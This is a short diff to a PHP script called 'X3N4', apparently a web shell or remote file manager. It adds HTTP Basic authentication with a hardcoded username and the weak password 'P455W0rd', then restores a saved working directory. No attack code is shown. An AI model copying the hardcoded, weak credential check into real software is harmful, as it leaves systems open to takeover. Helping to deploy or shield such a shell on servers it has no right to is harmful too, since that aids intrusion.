@@ -1,8 +1,9 @@
 <?php
 
-define('X3N4_VERSION', 'v0.1.5-alpha');
+define('X3N4_VERSION', 'v0.1.6-alpha');
 
-session_start();
+$user = 'x3n4';
+$password = 'P455W0rd';
 
 /**
  * Functions
@@ -86,10 +87,30 @@ function output_json($output = '')
     session_write_close();
     exit(0);
 }
+function require_auth($user, $password)
+{
+    $AUTH_USER = $user;
+    $AUTH_PASS = $password;
+    header('Cache-Control: no-cache, must-revalidate, max-age=0');
+    $has_supplied_credentials = !(empty($_SERVER['PHP_AUTH_USER']) && empty($_SERVER['PHP_AUTH_PW']));
+    $is_not_authenticated = (
+        !$has_supplied_credentials ||
+        $_SERVER['PHP_AUTH_USER'] != $AUTH_USER ||
+        $_SERVER['PHP_AUTH_PW']   != $AUTH_PASS
+    );
+    if ($is_not_authenticated) {
+        header('HTTP/1.1 401 Authorization Required');
+        header('WWW-Authenticate: Basic realm="Access denied"');
+        exit;
+    }
+}
 
 /**
  * CORE
  */
+require_auth($user, $password);
+session_start();
+
 if (!empty($_SESSION['pwd'])) {
     chdir($_SESSION['pwd']);
 }
